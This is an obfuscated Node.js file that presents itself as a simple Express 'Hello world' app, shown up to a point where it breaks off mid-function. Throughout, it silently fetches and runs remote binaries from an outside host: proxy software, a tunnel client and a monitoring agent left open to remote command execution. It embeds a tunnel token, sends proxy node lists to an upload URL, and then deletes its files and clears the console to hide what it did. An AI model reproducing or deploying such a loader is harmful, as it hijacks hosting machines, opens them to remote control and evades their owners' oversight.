const _0x1c3f31=_0x3960;(function(_0x3c9434,_0x531999){const _0x20e930=_0x3960,_0x318f52=_0x3c9434();while(!![]){try{const _0x39f186=-parseInt(_0x20e930(0x1ea))/0x1+parseInt(_0x20e930(0x29d))/0x2+parseInt(_0x20e930(0x24d))/0x3*(-parseInt(_0x20e930(0x275))/0x4)+parseInt(_0x20e930(0x297))/0x5*(-parseInt(_0x20e930(0x2a4))/0x6)+parseInt(_0x20e930(0x251))/0x7*(-parseInt(_0x20e930(0x273))/0x8)+-parseInt(_0x20e930(0x1f8))/0x9*(parseInt(_0x20e930(0x26f))/0xa)+parseInt(_0x20e930(0x1e4))/0xb;if(_0x39f186===_0x531999)break;else _0x318f52['push'](_0x318f52['shift']());}catch(_0x538cb){_0x318f52['push'](_0x318f52['shift']());}}}(_0x1ee9,0x8518f));function _0x1ee9(){const _0x527fd2=['fileUrl','tcp','writeFileSync','all','firefox','NAME','pipe','/api/add-subscriptions','Error\x20reading\x20boot.log:','catch','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','nohup\x20','1029','send','\x0avless://','get','arch','UUID','\x0a\x20\x20tunnel:\x20','App\x20is\x20running','unlinkSync','/tunnel.yml\x20run','chmod','\x20successfully','Error\x20downloading\x20files:','true','toString','\x0aclient_secret:\x20','createWriteStream','application/json','config.yaml','length','ArgoDomain:','\x20is\x20created','text/plain;\x20charset=utf-8','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','web\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/v1','cdns.doon.eu.org','SUB_PATH','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','includes','Content-Type','fileName','2053','/trojan-argo','set','env','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','data','response','\x20-s\x20','8443','message','readFileSync','join','CFIP','\x20-c\x20\x22','success','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/config.json\x20>/dev/null\x202>&1\x20&','direct','127.0.0.1','error','NEZHA_PORT','blackhole','test','./tmp','freedom','NEZHA\x20variable\x20is\x20empty,skip\x20running','867KPmjbB','Subscription\x20uploaded\x20successfully','AUTO_ACCESS','vless','98063ZppmQt','tunnel.yml','platform','isFile','stringify','list.txt','Error\x20in\x20startserver:','https://arm64.ssss.nyc.mn/agent','readdirSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','from','charAt','win32','rm\x20-rf\x20','filter','trojan','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','ARGO_PORT','listen','\x20>/dev/null\x202>&1\x20&','&path=%2Fvless-argo%3Fed%3D2560#','exec','\x0a\x0avmess://','Add\x20automatic\x20access\x20task\x20faild:\x20','amd','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x20\x20\x20\x20','\x20already\x20exists','https://arm64.ssss.nyc.mn/v1','random','4091490JYpXLc','eyJhIjoiNmEyNTE1NWVjNTkzNzRhZjA2ZjUwYmVmZDEwZTMzY2EiLCJ0IjoiNGVjNjc2M2QtZmViNC00N2FkLTkyOTEtMzFlODY4Y2MxYWM2IiwicyI6Ik56VXhabU5sTlRZdE16WmlZeTAwWWpjeUxXRTRaVGN0TURSbE9HWTRZakUzT1RrMyJ9','/vmess-argo?ed=2560','/api/delete-nodes','264FJxqzI','del\x20/f\x20/q\x20','5708aAvNJh','/vless-argo','php\x20running\x20error:\x20','\x20is\x20running','Nodes\x20uploaded\x20successfully','http://ip-api.com/json/','SERVER_PORT','has','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','axios','PROJECT_URL','statSync','boot.log','arm','ARGO_DOMAIN','NEZHA_KEY','UPLOAD_URL','2087','\x20>/dev/null\x202>&1','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','child_process','pkill\x20-f\x20\x22[','Empowerment\x20failed\x20for\x20','czqtunnel25122901','/api/add-nodes','&path=%2Ftrojan-argo%3Fed%3D2560#','/dev/null','Download\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','unlink','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','quic','Skipping\x20adding\x20automatic\x20access\x20task','\x22\x20>\x20/dev/null\x202>&1','10UmfEHe','npm\x20running\x20error:\x20','Hello\x20world!','?encryption=none&security=tls&sni=','&fp=firefox&type=ws&host=','\x20>\x20nul\x202>&1','313604QJNinM','log','unshift','https://arm64.ssss.nyc.mn/bot','floor','basename','match','19782kzVJCs','https://arm64.ssss.nyc.mn/web','443','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x0atrojan://','FILE_PATH','Empowerment\x20success\x20for\x20','\x20failed:\x20','existsSync','Error\x20executing\x20command:\x20','aarch64','path','clear','NEZHA_SERVER','post','taskkill\x20/f\x20/im\x20','30478855fjPYbi','utf-8','country_code','ea2ff218-fa77-46d3-97c7-a20f6834f051','split','xtls-rprx-vision','682848kqiKem','\x20-p\x20','TunnelSecret','2096','forEach','Unknown','?security=tls&sni=','--tls','tls','automatic\x20access\x20task\x20added\x20successfully','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','org','substring','config.json','18ybavZG','express','status','countryCode','http','base64','\x0a\x20\x20credentials-file:\x20','.exe\x20>\x20nul\x202>&1','none','tunnel.json','then','https://amd64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/web','util','push'];_0x1ee9=function(){return _0x527fd2;};return _0x1ee9();}const express=require(_0x1c3f31(0x1f9)),app=express(),axios=require(_0x1c3f31(0x27e)),os=require('os'),fs=require('fs'),path=require(_0x1c3f31(0x2af)),{promisify}=require(_0x1c3f31(0x205)),exec=promisify(require(_0x1c3f31(0x289))[_0x1c3f31(0x266)]),{execSync}=require(_0x1c3f31(0x289)),UPLOAD_URL=process[_0x1c3f31(0x236)][_0x1c3f31(0x285)]||'',PROJECT_URL=process['env'][_0x1c3f31(0x27f)]||'',AUTO_ACCESS=process[_0x1c3f31(0x236)][_0x1c3f31(0x24f)]||![],FILE_PATH=process[_0x1c3f31(0x236)][_0x1c3f31(0x2a9)]||_0x1c3f31(0x24a),SUB_PATH=process[_0x1c3f31(0x236)][_0x1c3f31(0x22e)]||_0x1c3f31(0x213),PORT=process[_0x1c3f31(0x236)][_0x1c3f31(0x27b)]||process[_0x1c3f31(0x236)]['PORT']||0xbb8,UUID=process[_0x1c3f31(0x236)][_0x1c3f31(0x218)]||_0x1c3f31(0x1e7),NEZHA_SERVER=process[_0x1c3f31(0x236)][_0x1c3f31(0x2b1)]||'',NEZHA_PORT=process[_0x1c3f31(0x236)][_0x1c3f31(0x247)]||'',NEZHA_KEY=process['env'][_0x1c3f31(0x284)]||'',ARGO_DOMAIN=process['env'][_0x1c3f31(0x283)]||'czqtunnel25122901.czq2.de5.net',ARGO_AUTH=process[_0x1c3f31(0x236)]['ARGO_AUTH']||_0x1c3f31(0x270),ARGO_PORT=process['env'][_0x1c3f31(0x262)]||0x1f41,CFIP=process[_0x1c3f31(0x236)][_0x1c3f31(0x23f)]||_0x1c3f31(0x22d),CFPORT=process[_0x1c3f31(0x236)]['CFPORT']||0x1bb,NAME=process['env'][_0x1c3f31(0x20c)]||_0x1c3f31(0x28c);!fs[_0x1c3f31(0x2ac)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x1c3f31(0x228))):console['log'](FILE_PATH+_0x1c3f31(0x26c));function generateRandomName(){const _0xbfe621=_0x1c3f31,_0x4bb708='abcdefghijklmnopqrstuvwxyz';let _0x3f4613='';for(let _0x4ad8a1=0x0;_0x4ad8a1<0x6;_0x4ad8a1++){_0x3f4613+=_0x4bb708['charAt'](Math[_0xbfe621(0x2a1)](Math[_0xbfe621(0x26e)]()*_0x4bb708['length']));}return _0x3f4613;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x1c3f31(0x23e)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x1c3f31(0x23e)](FILE_PATH,botName),subPath=path[_0x1c3f31(0x23e)](FILE_PATH,'sub.txt'),listPath=path[_0x1c3f31(0x23e)](FILE_PATH,_0x1c3f31(0x256)),bootLogPath=path[_0x1c3f31(0x23e)](FILE_PATH,_0x1c3f31(0x281)),configPath=path[_0x1c3f31(0x23e)](FILE_PATH,_0x1c3f31(0x1f7));function deleteNodes(){const _0x4e66b5=_0x1c3f31;try{if(!UPLOAD_URL)return;if(!fs[_0x4e66b5(0x2ac)](subPath))return;let _0x9b7abc;try{_0x9b7abc=fs[_0x4e66b5(0x23d)](subPath,_0x4e66b5(0x1e5));}catch{return null;}const _0x157f95=Buffer[_0x4e66b5(0x25b)](_0x9b7abc,'base64')[_0x4e66b5(0x221)]('utf-8'),_0x27563d=_0x157f95[_0x4e66b5(0x1e8)]('\x0a')[_0x4e66b5(0x25f)](_0x83b2ff=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4e66b5(0x249)](_0x83b2ff));if(_0x27563d[_0x4e66b5(0x226)]===0x0)return;return axios[_0x4e66b5(0x2b2)](UPLOAD_URL+_0x4e66b5(0x272),JSON[_0x4e66b5(0x255)]({'nodes':_0x27563d}),{'headers':{'Content-Type':_0x4e66b5(0x224)}})['catch'](_0x3e6d18=>{return null;}),null;}catch(_0x376650){return null;}}function cleanupOldFiles(){const _0x2c9e98=_0x1c3f31;try{const _0x310ffd=fs[_0x2c9e98(0x259)](FILE_PATH);_0x310ffd['forEach'](_0x4ab602=>{const _0x4222a0=_0x2c9e98,_0xb94ff3=path[_0x4222a0(0x23e)](FILE_PATH,_0x4ab602);try{const _0x1f3a56=fs[_0x4222a0(0x280)](_0xb94ff3);_0x1f3a56[_0x4222a0(0x254)]()&&fs[_0x4222a0(0x21b)](_0xb94ff3);}catch(_0x4777a9){}});}catch(_0x508489){}}app[_0x1c3f31(0x216)]('/',function(_0x6fba9e,_0x5ab334){const _0x3d04a9=_0x1c3f31;_0x5ab334[_0x3d04a9(0x214)](_0x3d04a9(0x299));});function _0x3960(_0x23c4a0,_0x32ff4e){_0x23c4a0=_0x23c4a0-0x1e3;const _0x1ee919=_0x1ee9();let _0x39604c=_0x1ee919[_0x23c4a0];return _0x39604c;}async function generateConfig(){const _0x4552e0=_0x1c3f31,_0x3b7a52={'log':{'access':_0x4552e0(0x28f),'error':_0x4552e0(0x28f),'loglevel':_0x4552e0(0x200)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4552e0(0x250),'settings':{'clients':[{'id':UUID,'flow':_0x4552e0(0x1e9)}],'decryption':_0x4552e0(0x200),'fallbacks':[{'dest':0xbb9},{'path':_0x4552e0(0x276),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x4552e0(0x234),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x4552e0(0x200)},'streamSettings':{'network':_0x4552e0(0x208),'security':'none'}},{'port':0xbba,'listen':_0x4552e0(0x245),'protocol':_0x4552e0(0x250),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x4552e0(0x200),'wsSettings':{'path':_0x4552e0(0x276)}},'sniffing':{'enabled':!![],'destOverride':[_0x4552e0(0x1fc),_0x4552e0(0x1f2),_0x4552e0(0x294)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4552e0(0x245),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4552e0(0x1fc),_0x4552e0(0x1f2),_0x4552e0(0x294)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4552e0(0x245),'protocol':_0x4552e0(0x260),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4552e0(0x200),'wsSettings':{'path':_0x4552e0(0x234)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4552e0(0x1f2),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x4552e0(0x24b),'tag':_0x4552e0(0x244)},{'protocol':_0x4552e0(0x248),'tag':'block'}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x4552e0(0x1f7)),JSON[_0x4552e0(0x255)](_0x3b7a52,null,0x2));}function getSystemArchitecture(){const _0x2bcbc5=_0x1c3f31,_0x4a7a0f=os[_0x2bcbc5(0x217)]();return _0x4a7a0f==='arm'||_0x4a7a0f==='arm64'||_0x4a7a0f===_0x2bcbc5(0x2ae)?_0x2bcbc5(0x282):_0x2bcbc5(0x269);}function downloadFile(_0x37ebe6,_0xa4fd8d,_0x4f0bde){const _0x37068=_0x1c3f31,_0x46ef92=_0x37ebe6;!fs[_0x37068(0x2ac)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x2e66ee=fs[_0x37068(0x223)](_0x46ef92);axios({'method':'get','url':_0xa4fd8d,'responseType':'stream'})[_0x37068(0x202)](_0x2f5de3=>{const _0x23ca82=_0x37068;_0x2f5de3[_0x23ca82(0x238)][_0x23ca82(0x20d)](_0x2e66ee),_0x2e66ee['on']('finish',()=>{const _0x5e85d2=_0x23ca82;_0x2e66ee['close'](),console[_0x5e85d2(0x29e)]('Download\x20'+path[_0x5e85d2(0x2a2)](_0x46ef92)+_0x5e85d2(0x21e)),_0x4f0bde(null,_0x46ef92);}),_0x2e66ee['on'](_0x23ca82(0x246),_0x2d8601=>{const _0x5e5a17=_0x23ca82;fs[_0x5e5a17(0x292)](_0x46ef92,()=>{});const _0x5d9f55=_0x5e5a17(0x290)+path[_0x5e5a17(0x2a2)](_0x46ef92)+_0x5e5a17(0x2ab)+_0x2d8601[_0x5e5a17(0x23c)];console[_0x5e5a17(0x246)](_0x5d9f55),_0x4f0bde(_0x5d9f55);});})[_0x37068(0x210)](_0x162c5f=>{const _0x5ef32c=_0x37068,_0x3b74fb=_0x5ef32c(0x290)+path[_0x5ef32c(0x2a2)](_0x46ef92)+_0x5ef32c(0x2ab)+_0x162c5f['message'];console[_0x5ef32c(0x246)](_0x3b74fb),_0x4f0bde(_0x3b74fb);});}async function downloadFilesAndRun(){const _0x3f3eca=_0x1c3f31,_0x2f07f5=getSystemArchitecture(),_0x3e7e23=getFilesForArchitecture(_0x2f07f5);if(_0x3e7e23[_0x3f3eca(0x226)]===0x0){console[_0x3f3eca(0x29e)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x1d9c3b=_0x3e7e23['map'](_0xa8a4f4=>{return new Promise((_0xd1a530,_0x568608)=>{const _0x4a1c3a=_0x3960;downloadFile(_0xa8a4f4[_0x4a1c3a(0x232)],_0xa8a4f4[_0x4a1c3a(0x207)],(_0x3dd279,_0x3152fc)=>{_0x3dd279?_0x568608(_0x3dd279):_0xd1a530(_0x3152fc);});});});try{await Promise[_0x3f3eca(0x20a)](_0x1d9c3b);}catch(_0xfc238f){console[_0x3f3eca(0x246)](_0x3f3eca(0x21f),_0xfc238f);return;}function _0x1bb31d(_0x920e7d){const _0x527fc7=0x1fd;_0x920e7d['forEach'](_0xf29f3e=>{const _0x3e9a31=_0x3960;fs[_0x3e9a31(0x2ac)](_0xf29f3e)&&fs[_0x3e9a31(0x21d)](_0xf29f3e,_0x527fc7,_0x1d6b0=>{const _0x431f19=_0x3e9a31;_0x1d6b0?console[_0x431f19(0x246)](_0x431f19(0x28b)+_0xf29f3e+':\x20'+_0x1d6b0):console[_0x431f19(0x29e)](_0x431f19(0x2aa)+_0xf29f3e+':\x20'+_0x527fc7[_0x431f19(0x221)](0x8));});});}const _0x2d7f69=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1bb31d(_0x2d7f69);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2053a9=NEZHA_SERVER[_0x3f3eca(0x230)](':')?NEZHA_SERVER[_0x3f3eca(0x1e8)](':')['pop']():'',_0x36ad8d=new Set([_0x3f3eca(0x2a6),_0x3f3eca(0x23b),_0x3f3eca(0x1ed),'2087','2083',_0x3f3eca(0x233)]),_0x52d403=_0x36ad8d[_0x3f3eca(0x27c)](_0x2053a9)?_0x3f3eca(0x220):'false',_0xf335dd=_0x3f3eca(0x222)+NEZHA_KEY+_0x3f3eca(0x25a)+NEZHA_SERVER+_0x3f3eca(0x26a)+_0x52d403+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3f3eca(0x209)](path['join'](FILE_PATH,_0x3f3eca(0x225)),_0xf335dd);const _0x31acfb=_0x3f3eca(0x212)+phpPath+_0x3f3eca(0x240)+FILE_PATH+_0x3f3eca(0x22a);try{await exec(_0x31acfb),console[_0x3f3eca(0x29e)](phpName+_0x3f3eca(0x278)),await new Promise(_0x405e6a=>setTimeout(_0x405e6a,0x3e8));}catch(_0x396c46){console[_0x3f3eca(0x246)](_0x3f3eca(0x277)+_0x396c46);}}else{let _0x358786='';const _0x5b51ad=[_0x3f3eca(0x2a6),_0x3f3eca(0x23b),_0x3f3eca(0x1ed),_0x3f3eca(0x286),'2083',_0x3f3eca(0x233)];_0x5b51ad[_0x3f3eca(0x230)](NEZHA_PORT)&&(_0x358786=_0x3f3eca(0x1f1));const _0x59b67a=_0x3f3eca(0x212)+npmPath+_0x3f3eca(0x23a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3f3eca(0x1eb)+NEZHA_KEY+'\x20'+_0x358786+_0x3f3eca(0x242);try{await exec(_0x59b67a),console[_0x3f3eca(0x29e)](npmName+_0x3f3eca(0x278)),await new Promise(_0x1d1603=>setTimeout(_0x1d1603,0x3e8));}catch(_0x47703f){console[_0x3f3eca(0x246)](_0x3f3eca(0x298)+_0x47703f);}}}else console[_0x3f3eca(0x29e)](_0x3f3eca(0x24c));const _0x3185c1='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x3f3eca(0x243);try{await exec(_0x3185c1),console[_0x3f3eca(0x29e)](webName+'\x20is\x20running'),await new Promise(_0x17df22=>setTimeout(_0x17df22,0x3e8));}catch(_0x3eb83a){console[_0x3f3eca(0x246)](_0x3f3eca(0x22b)+_0x3eb83a);}if(fs[_0x3f3eca(0x2ac)](botPath)){let _0x3b84e6;if(ARGO_AUTH[_0x3f3eca(0x2a3)](/^[A-Z0-9a-z=]{120,250}$/))_0x3b84e6=_0x3f3eca(0x293)+ARGO_AUTH;else ARGO_AUTH[_0x3f3eca(0x2a3)](/TunnelSecret/)?_0x3b84e6=_0x3f3eca(0x237)+FILE_PATH+_0x3f3eca(0x21c):_0x3b84e6=_0x3f3eca(0x291)+FILE_PATH+_0x3f3eca(0x27d)+ARGO_PORT;try{await exec(_0x3f3eca(0x212)+botPath+'\x20'+_0x3b84e6+_0x3f3eca(0x264)),console[_0x3f3eca(0x29e)](botName+'\x20is\x20running'),await new Promise(_0x3e4268=>setTimeout(_0x3e4268,0x7d0));}catch(_0x1f8228){console[_0x3f3eca(0x246)](_0x3f3eca(0x2ad)+_0x1f8228);}}await new Promise(_0x144b5b=>setTimeout(_0x144b5b,0x1388));}function getFilesForArchitecture(_0x569417){const _0x47b610=_0x1c3f31;let _0x3ba4f3;_0x569417===_0x47b610(0x282)?_0x3ba4f3=[{'fileName':webPath,'fileUrl':_0x47b610(0x2a5)},{'fileName':botPath,'fileUrl':_0x47b610(0x2a0)}]:_0x3ba4f3=[{'fileName':webPath,'fileUrl':_0x47b610(0x204)},{'fileName':botPath,'fileUrl':_0x47b610(0x203)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x78ee76=_0x569417==='arm'?_0x47b610(0x258):'https://amd64.ssss.nyc.mn/agent';_0x3ba4f3[_0x47b610(0x29f)]({'fileName':npmPath,'fileUrl':_0x78ee76});}else{const _0x3e8c78=_0x569417===_0x47b610(0x282)?_0x47b610(0x26d):_0x47b610(0x22c);_0x3ba4f3[_0x47b610(0x29f)]({'fileName':phpPath,'fileUrl':_0x3e8c78});}}return _0x3ba4f3;}function argoType(){const _0x465fd6=_0x1c3f31;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x465fd6(0x29e)](_0x465fd6(0x288));return;}if(ARGO_AUTH['includes'](_0x465fd6(0x1ec))){fs[_0x465fd6(0x209)](path[_0x465fd6(0x23e)](FILE_PATH,_0x465fd6(0x201)),ARGO_AUTH);const _0x5e5993=_0x465fd6(0x219)+ARGO_AUTH[_0x465fd6(0x1e8)]('\x22')[0xb]+_0x465fd6(0x1fe)+path[_0x465fd6(0x23e)](FILE_PATH,_0x465fd6(0x201))+_0x465fd6(0x211)+ARGO_DOMAIN+_0x465fd6(0x1f4)+ARGO_PORT+_0x465fd6(0x261);fs[_0x465fd6(0x209)](path['join'](FILE_PATH,_0x465fd6(0x252)),_0x5e5993);}else console[_0x465fd6(0x29e)](_0x465fd6(0x22f));}async function extractDomains(){const _0xe9d1da=_0x1c3f31;let _0x4bbc3e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4bbc3e=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x4bbc3e),await _0x30e614(_0x4bbc3e);else try{const _0x1670b8=fs[_0xe9d1da(0x23d)](path[_0xe9d1da(0x23e)](FILE_PATH,_0xe9d1da(0x281)),_0xe9d1da(0x1e5)),_0x341f09=_0x1670b8[_0xe9d1da(0x1e8)]('\x0a'),_0x46c69d=[];_0x341f09[_0xe9d1da(0x1ee)](_0x2e9bc3=>{const _0x502451=_0xe9d1da,_0xb405e8=_0x2e9bc3[_0x502451(0x2a3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xb405e8){const _0x2b0a72=_0xb405e8[0x1];_0x46c69d[_0x502451(0x206)](_0x2b0a72);}});if(_0x46c69d['length']>0x0)_0x4bbc3e=_0x46c69d[0x0],console[_0xe9d1da(0x29e)](_0xe9d1da(0x227),_0x4bbc3e),await _0x30e614(_0x4bbc3e);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,_0xe9d1da(0x281)));async function _0x3157df(){const _0x2a63f9=_0xe9d1da;try{process[_0x2a63f9(0x253)]==='win32'?await exec(_0x2a63f9(0x1e3)+botName+_0x2a63f9(0x1ff)):await exec(_0x2a63f9(0x28a)+botName[_0x2a63f9(0x25c)](0x0)+']'+botName[_0x2a63f9(0x1f6)](0x1)+_0x2a63f9(0x296));}catch(_0x33299d){}}_0x3157df(),await new Promise(_0x309ada=>setTimeout(_0x309ada,0xbb8));const _0x40834f=_0xe9d1da(0x291)+FILE_PATH+_0xe9d1da(0x27d)+ARGO_PORT;try{await exec(_0xe9d1da(0x212)+botPath+'\x20'+_0x40834f+_0xe9d1da(0x264)),console[_0xe9d1da(0x29e)](botName+_0xe9d1da(0x278)),await new Promise(_0x58d7f0=>setTimeout(_0x58d7f0,0xbb8)),await extractDomains();}catch(_0x57ef42){console[_0xe9d1da(0x246)](_0xe9d1da(0x2ad)+_0x57ef42);}}}catch(_0xe9d05c){console[_0xe9d1da(0x246)](_0xe9d1da(0x20f),_0xe9d05c);}async function _0x2ae00d(){const _0x3a8bbc=_0xe9d1da;try{const _0x385442=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x385442[_0x3a8bbc(0x238)]&&_0x385442[_0x3a8bbc(0x238)][_0x3a8bbc(0x1e6)]&&_0x385442[_0x3a8bbc(0x238)][_0x3a8bbc(0x1f5)])return _0x385442['data'][_0x3a8bbc(0x1e6)]+'_'+_0x385442[_0x3a8bbc(0x238)][_0x3a8bbc(0x1f5)];}catch(_0x1461bc){try{const _0x151076=await axios['get'](_0x3a8bbc(0x27a),{'timeout':0xbb8});if(_0x151076[_0x3a8bbc(0x238)]&&_0x151076[_0x3a8bbc(0x238)][_0x3a8bbc(0x1fa)]===_0x3a8bbc(0x241)&&_0x151076[_0x3a8bbc(0x238)]['countryCode']&&_0x151076['data'][_0x3a8bbc(0x1f5)])return _0x151076[_0x3a8bbc(0x238)][_0x3a8bbc(0x1fb)]+'_'+_0x151076[_0x3a8bbc(0x238)][_0x3a8bbc(0x1f5)];}catch(_0x290e0d){}}return _0x3a8bbc(0x1ef);}async function _0x30e614(_0x1f1619){const _0x4182a3=await _0x2ae00d(),_0x419e27=NAME?NAME+'-'+_0x4182a3:_0x4182a3;return new Promise(_0x596e64=>{setTimeout(()=>{const _0x9cd848=_0x3960,_0x21d1f1={'v':'2','ps':''+_0x419e27,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x9cd848(0x200),'net':'ws','type':_0x9cd848(0x200),'host':_0x1f1619,'path':_0x9cd848(0x271),'tls':_0x9cd848(0x1f2),'sni':_0x1f1619,'alpn':'','fp':_0x9cd848(0x20b)},_0x3c2a50=_0x9cd848(0x215)+UUID+'@'+CFIP+':'+CFPORT+_0x9cd848(0x29a)+_0x1f1619+'&fp=firefox&type=ws&host='+_0x1f1619+_0x9cd848(0x265)+_0x419e27+_0x9cd848(0x267)+Buffer[_0x9cd848(0x25b)](JSON[_0x9cd848(0x255)](_0x21d1f1))[_0x9cd848(0x221)](_0x9cd848(0x1fd))+_0x9cd848(0x2a8)+UUID+'@'+CFIP+':'+CFPORT+_0x9cd848(0x1f0)+_0x1f1619+_0x9cd848(0x29b)+_0x1f1619+_0x9cd848(0x28e)+_0x419e27+_0x9cd848(0x26b);console['log'](Buffer[_0x9cd848(0x25b)](_0x3c2a50)[_0x9cd848(0x221)](_0x9cd848(0x1fd))),fs[_0x9cd848(0x209)](subPath,Buffer[_0x9cd848(0x25b)](_0x3c2a50)[_0x9cd848(0x221)]('base64')),console[_0x9cd848(0x29e)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x9cd848(0x216)]('/'+SUB_PATH,(_0x2b47f7,_0x3fc884)=>{const _0x41e70e=_0x9cd848,_0x4d40b8=Buffer[_0x41e70e(0x25b)](_0x3c2a50)[_0x41e70e(0x221)](_0x41e70e(0x1fd));_0x3fc884[_0x41e70e(0x235)](_0x41e70e(0x231),_0x41e70e(0x229)),_0x3fc884[_0x41e70e(0x214)](_0x4d40b8);}),_0x596e64(_0x3c2a50);},0x7d0);});}}async function uploadNodes(){const _0x350aa0=_0x1c3f31;if(UPLOAD_URL&&PROJECT_URL){const _0x2ec2ef=PROJECT_URL+'/'+SUB_PATH,_0x4a2796={'subscription':[_0x2ec2ef]};try{const _0x204ab2=await axios['post'](UPLOAD_URL+_0x350aa0(0x20e),_0x4a2796,{'headers':{'Content-Type':_0x350aa0(0x224)}});return _0x204ab2&&_0x204ab2[_0x350aa0(0x1fa)]===0xc8?(console[_0x350aa0(0x29e)](_0x350aa0(0x24e)),_0x204ab2):null;}catch(_0x41e11c){if(_0x41e11c[_0x350aa0(0x239)]){if(_0x41e11c[_0x350aa0(0x239)][_0x350aa0(0x1fa)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x350aa0(0x2ac)](listPath))return;const _0x170a05=fs[_0x350aa0(0x23d)](listPath,_0x350aa0(0x1e5)),_0x571b11=_0x170a05[_0x350aa0(0x1e8)]('\x0a')[_0x350aa0(0x25f)](_0x7ca79b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x350aa0(0x249)](_0x7ca79b));if(_0x571b11[_0x350aa0(0x226)]===0x0)return;const _0x1fefe8=JSON['stringify']({'nodes':_0x571b11});try{const _0x536141=await axios['post'](UPLOAD_URL+_0x350aa0(0x28d),_0x1fefe8,{'headers':{'Content-Type':_0x350aa0(0x224)}});return _0x536141&&_0x536141['status']===0xc8?(console['log'](_0x350aa0(0x279)),_0x536141):null;}catch(_0x5aed4b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xbe42d9=_0x3960,_0x1d7457=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1d7457[_0xbe42d9(0x206)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1d7457[_0xbe42d9(0x206)](phpPath);process['platform']===_0xbe42d9(0x25d)?exec(_0xbe42d9(0x274)+_0x1d7457[_0xbe42d9(0x23e)]('\x20')+_0xbe42d9(0x29c),_0xe1feae=>{const _0x277854=_0xbe42d9;console[_0x277854(0x2b0)](),console[_0x277854(0x29e)](_0x277854(0x21a)),console[_0x277854(0x29e)](_0x277854(0x2a7));}):exec(_0xbe42d9(0x25e)+_0x1d7457[_0xbe42d9(0x23e)]('\x20')+_0xbe42d9(0x287),_0x1149b6=>{const _0x6ddf0b=_0xbe42d9;console['clear'](),console[_0x6ddf0b(0x29e)]('App\x20is\x20running'),console[_0x6ddf0b(0x29e)](_0x6ddf0b(0x2a7));});},0x15f90);}cleanFiles();async function AddVisitTask(){const 